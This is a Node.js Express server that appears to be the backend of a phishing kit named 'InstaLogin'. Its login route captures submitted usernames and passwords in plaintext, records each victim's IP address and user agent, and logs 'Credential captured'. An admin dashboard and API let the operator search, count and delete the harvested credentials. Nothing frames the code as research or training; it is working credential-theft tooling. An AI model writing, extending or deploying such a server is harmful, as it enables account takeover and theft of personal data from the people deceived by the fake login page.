require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ====== Storage Layer ======
let inMemoryStore = [];
let useInMemory = true;
let Credential = null;

// Try MongoDB connection
async function connectDB() {
  try {
    const mongoose = require('mongoose');
    mongoose.set('bufferCommands', false);
    await mongoose.connect(process.env.MONGODB_URI, {
      serverSelectionTimeoutMS: 3000,
      connectTimeoutMS: 3000
    });
    Credential = require('./models/Credential');
    useInMemory = false;
    console.log('✅ Connected to MongoDB');
  } catch (err) {
    useInMemory = true;
    console.log('⚠️  MongoDB not available — using in-memory storage');
    console.log('   Install MongoDB or add a MongoDB Atlas URI to .env to persist data\n');
  }
}

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2, 12);
}

// ==================== API Routes ====================

app.post('/api/credentials', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });

    const record = {
      username,
      password,
      ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'] || 'Unknown',
      timestamp: new Date()
    };

    if (useInMemory) {
      record._id = generateId();
      inMemoryStore.unshift(record);
    } else {
      const credential = new Credential(record);
      await credential.save();
    }
    console.log(`📥 Credential captured: ${username}`);
    res.status(201).json({ success: true });
  } catch (error) {
    console.error('Error saving:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/credentials', async (req, res) => {
  try {
    const { search, sort } = req.query;

    if (useInMemory) {
      let results = [...inMemoryStore];
      if (search) {
        const s = search.toLowerCase();
        results = results.filter(c => c.username.toLowerCase().includes(s) || (c.ipAddress || '').toLowerCase().includes(s));
      }
      if (sort === 'oldest') results.reverse();
      return res.json(results);
    }

    let query = {};
    if (search) {
      query = { $or: [{ username: { $regex: search, $options: 'i' } }, { ipAddress: { $regex: search, $options: 'i' } }] };
    }
    const credentials = await Credential.find(query).sort({ timestamp: sort === 'oldest' ? 1 : -1 });
    res.json(credentials);
  } catch (error) {
    console.error('Error fetching:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/stats', async (req, res) => {
  try {
    const today = new Date(); today.setHours(0, 0, 0, 0);

    if (useInMemory) {
      return res.json({
        totalSubmissions: inMemoryStore.length,
        todaySubmissions: inMemoryStore.filter(c => new Date(c.timestamp) >= today).length,
        uniqueUsernames: new Set(inMemoryStore.map(c => c.username)).size,
        weeklyData: [],
        latestSubmission: inMemoryStore.length > 0 ? inMemoryStore[0].timestamp : null
      });
    }

    const totalSubmissions = await Credential.countDocuments();
    const todaySubmissions = await Credential.countDocuments({ timestamp: { $gte: today } });
    const uniqueUsernames = await Credential.distinct('username');
    const latestSubmission = await Credential.findOne().sort({ timestamp: -1 });

    res.json({
      totalSubmissions,
      todaySubmissions,
      uniqueUsernames: uniqueUsernames.length,
      weeklyData: [],
      latestSubmission: latestSubmission ? latestSubmission.timestamp : null
    });
  } catch (error) {
    console.error('Error fetching stats:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/credentials/:id', async (req, res) => {
  try {
    if (useInMemory) {
      const idx = inMemoryStore.findIndex(c => c._id === req.params.id);
      if (idx === -1) return res.status(404).json({ error: 'Not found' });
      inMemoryStore.splice(idx, 1);
      return res.json({ success: true });
    }
    const result = await Credential.findByIdAndDelete(req.params.id);
    if (!result) return res.status(404).json({ error: 'Not found' });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/credentials', async (req, res) => {
  try {
    if (useInMemory) { inMemoryStore = []; return res.json({ success: true }); }
    await Credential.deleteMany({});
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Start
async function start() {
  await connectDB();
  app.listen(PORT, () => {
    console.log(`🚀 InstaLogin Server running at http://localhost:${PORT}`);
    console.log(`📱 Login Page:      http://localhost:${PORT}`);
    console.log(`🔐 Admin Dashboard: http://localhost:${PORT}/admin\n`);
  });
}

start();
